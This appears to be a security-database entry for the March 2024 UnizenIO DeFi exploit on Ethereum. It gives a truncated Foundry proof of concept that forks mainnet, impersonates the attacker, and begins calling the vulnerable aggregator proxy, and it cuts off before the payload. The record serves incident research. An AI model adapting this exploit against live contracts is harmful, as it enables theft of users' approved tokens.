# [?] UnizenIO - unverified external call

## Summary
Severity: Unknown
Chain: Ethereum
Component: UnizenIO
Published: 2024-03-09
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/UnizenIO_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~2M
References:
- https://twitter.com/SlowMist_Team/status/1766311510362734824

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";
// @KeyInfo - Total Lost : ~2M USD$
// Attacker : https://etherscan.io/address/0x2ad8aed847e8d4d3da52aabb7d0f5c25729d10df
// Vulnerable Contract : (Unizen: Trade Aggregator Proxy) https://etherscan.io/address/0xd3f64baa732061f8b3626ee44bab354f854877ac
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x923d1d63a1165ebd3521516f6d22d015f2e1b4b22d5dc954152b6c089c765fcd ( one of the transactions)

// @Analysis
// https://twitter.com/SlowMist_Team/status/1766311510362734824
// It's an unverified contract.

contract UniZenIOTest is Test {
    address victim = address(0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a);
    address attacker = address(0x2aD8aed847e8d4D3da52AaBB7d0f5c25729D10df);
    address aggregator_proxy = address(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
    IERC20 DMTR = IERC20(0x51cB253744189f11241becb29BeDd3F1b5384fdB);

    function setUp() public {
        vm.createSelectFork("mainnet", 19_393_769);

        emit log_named_uint("Before attack, victim DMTR amount (in ether)", DMTR.balanceOf(victim) / 1 ether);
        emit log_named_uint(
            "Before attack, victim approved DMTR amount (in ether) on UnizenAggregator",
            DMTR.allowance(victim, address(aggregator_proxy)) / 1 ether
        );
    }

    function testExploit() public {
        vm.startPrank(attacker);
        aggregator_proxy.call{value: 1}(
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/UnizenIO_exp.sol_
